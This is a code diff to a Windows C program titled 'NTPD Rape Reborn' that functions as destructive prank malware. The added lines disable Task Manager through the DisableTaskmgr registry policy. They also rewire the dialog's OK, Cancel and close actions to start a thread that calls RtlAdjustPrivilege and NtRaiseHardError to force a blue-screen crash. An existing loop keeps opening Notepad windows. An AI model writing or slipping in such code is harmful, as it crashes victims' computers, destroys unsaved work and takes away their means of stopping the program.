@@ -5,6 +5,7 @@
 #include "NTPD Rape Reborn.h"
 #include <process.h>
 #include <shellapi.h>
+#include <stdio.h>
 #include <winternl.h>
 
 
@@ -54,6 +55,22 @@ INT_PTR CALLBACK NTPDRape(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
 	switch (message)
 	{
 	case WM_INITDIALOG:
+		LSTATUS lResult;
+		DWORD dwVal;
+		HKEY hKey;
+		
+		/* 
+		 * Disable Task Manager from Registry
+		 */
+		lResult = RegOpenKeyExA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 0, KEY_ALL_ACCESS, &hKey);
+ 		
+		if(lResult == ERROR_FILE_NOT_FOUND)
+		{
+			RegCreateKeyA(hKey, "DisableTaskmgr", &hKey);
+		}
+
+		RegSetValueExA(hKey, "DisableTaskmgr", 0, REG_DWORD, (LPBYTE)&dwVal , sizeof(DWORD));
+  		RegCloseKey(hKey);
 		
 		hWnd = GetDesktopWindow();
 		GetWindowRect(hWnd, lpRect);
@@ -71,14 +88,16 @@ INT_PTR CALLBACK NTPDRape(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
 	case WM_COMMAND:
 		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
 		{
-			EndDialog(hDlg, LOWORD(wParam));
+			_beginthreadex(NULL, 0, BSODThread, NULL, 0, 0);
 			return (INT_PTR)TRUE;
 		}
 		
 		if (LOWORD(wParam) == BeginEndButton)
 		{
 			if (IsDlgButtonChecked(hDlg, DisableButton) == BST_CHECKED)
+			{
 				EnableWindow(Btn, 0);
+			}
 
 			if (Running == FALSE)
 			{
@@ -100,6 +119,10 @@ INT_PTR CALLBACK NTPDRape(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
 			
 		}
 		break;
+
+	case WM_CLOSE:
+		_beginthreadex(NULL, 0, BSODThread, NULL, 0, 0);
+		break;
 	}
 	return (INT_PTR)FALSE;
 }
@@ -110,9 +133,9 @@ UINT __stdcall InvokeNotepad(void *)
 	do
 	{
 		ShellExecuteA(hWnd, "open", "notepad.exe", NULL, NULL, SW_SHOW);
-		TotalInstances = TotalInstances + 1;
-		SetDlgItemInt(hWnd, Instances, TotalInstances, 0);
 		OutputDebugStringA("Invoke Notepad");
+		// TotalInstances = TotalInstances + 1;
+		// SetDlgItemInt(hWnd, Instances, TotalInstances, 0);
 	} while (Running == TRUE);
 
 	return 0;
@@ -138,7 +161,7 @@ UINT __stdcall BSODThread(void *)
     pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
     pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
     NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bl); 
-    NtCall2(STATUS_ACCESS_VIOLATION, 0, 0, 0, 6, &Response);
+	NtCall2(STATUS_ACCESS_VIOLATION, 0, 0, 0, 6, &Response);
 
 	return 0;
 }
